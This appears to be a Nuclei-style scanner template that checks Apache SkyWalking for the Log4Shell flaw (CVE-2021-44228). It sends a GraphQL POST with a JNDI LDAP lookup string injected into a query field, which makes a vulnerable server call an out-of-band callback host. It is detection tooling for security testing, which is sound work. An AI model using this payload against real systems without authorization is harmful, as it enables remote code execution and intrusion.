id: cve-2021-44228-apache-skywalking
info:
  name: Apache Skywalking log4j2 RCE (CVE-2021-44228)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Apache SkyWalking is an application performance monitor mainly used by the Apache Software Foundation for microservices, cloud native and container-based environments. A log4j2 vulnerability (CVE-2021-44228) exists in the Apache SkyWalking performance monitoring system, which allows attackers to remotely execute code and control server permissions.
  reference:
    - https://github.com/apache/skywalking
    - https://fofa.so
  classification:
    cve-id:
      - CVE-2021-44228
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0

variables:
  dnslog: "{{interactsh-url}}"

http:
  - raw:
      - |
        POST /graphql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {
            "query": "query queryLogs($condition: LogQueryCondition) { queryLogs(condition: $condition) { total logs { serviceId ${jndi:ldap://{{dnslog}}} serviceName isError content } } }",
            "variables": {
                "condition": {
                    "metricName": "test",
                    "state": "ALL",
                    "paging": {
                        "pageSize": 10
                    }
                }
            }
        }
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
      - type: word
        part: header
        words:
          - "application/json"
